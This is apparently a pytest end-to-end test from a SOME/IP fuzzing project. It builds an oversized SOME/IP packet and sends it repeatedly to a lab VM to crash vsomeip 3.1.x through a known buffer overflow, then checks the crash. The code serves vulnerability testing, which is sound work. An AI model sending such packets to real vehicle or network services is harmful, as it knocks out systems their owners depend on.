"""E2E 8.10 — 触发已知 vsomeip 漏洞（需要旧版 vsomeip）。

条件：VM 上通过 switch_vsomeip_version.sh 切换到 3.1.x 后才运行。
默认跳过（旧版 vsomeip 未部署）。

vsomeip 3.1.x 漏洞：
  超长 payload（接近 65535 字节）导致 SD 模块缓冲区溢出，服务崩溃。
"""

from __future__ import annotations

import asyncio
import json
import struct
import urllib.request

import pytest

from someip_fuzzer.core.transport import SomeIpUdpTransport
from tests.e2e.conftest import AGENT_URL, VM_IP, VM_PORT


def _old_vsomeip_available() -> bool:
    """检查 VM 上是否运行旧版 vsomeip（通过 agent 的版本字段）。"""
    try:
        raw = urllib.request.urlopen(AGENT_URL + "/status", timeout=2).read()
        status = json.loads(raw)
        version = status.get("vsomeip_version", "")
        return version.startswith("3.1")
    except Exception:
        return False


def _build_overflow_packet(payload_size: int = 60000) -> bytes:
    """构造超长 payload 的 SOME/IP 报文（触发缓冲区溢出）。"""
    payload = b"\x41" * payload_size
    length = 8 + len(payload)
    header = struct.pack(
        ">HHIHH BBB B",
        0x1111,   # Service ID
        0x3333,   # Method ID
        length,   # Length
        0x0000,   # Client ID
        0x0001,   # Session ID
        0x01,     # Proto Ver
        0x01,     # Iface Ver
        0x00,     # MsgType = REQUEST
        0x00,     # RetCode = E_OK
    )
    return header + payload


@pytest.mark.skipif(
    not _old_vsomeip_available(),
    reason="旧版 vsomeip（3.1.x）未部署，跳过 CVE 测试"
)
@pytest.mark.asyncio
async def test_cve_large_payload_dos() -> None:
    """超长 payload 在 30 秒内导致 vsomeip 3.1.x 崩溃（alive=false）。"""
    overflow_pkt = _build_overflow_packet(60000)

    transport = SomeIpUdpTransport()
    await transport.start(remote_addr=(VM_IP, VM_PORT))

    try:
        for _ in range(10):
            await transport.send_raw(overflow_pkt)
            await asyncio.sleep(0.1)
    finally:
        await transport.stop()

    # 等待崩溃传播
    await asyncio.sleep(3.0)

    raw = urllib.request.urlopen(AGENT_URL + "/status", timeout=3).read()
    status = json.loads(raw)
    assert status.get("alive") is False, (
        "发送超长 payload 后 vsomeip 3.1.x 应崩溃，但 agent 报告 alive=true"
    )
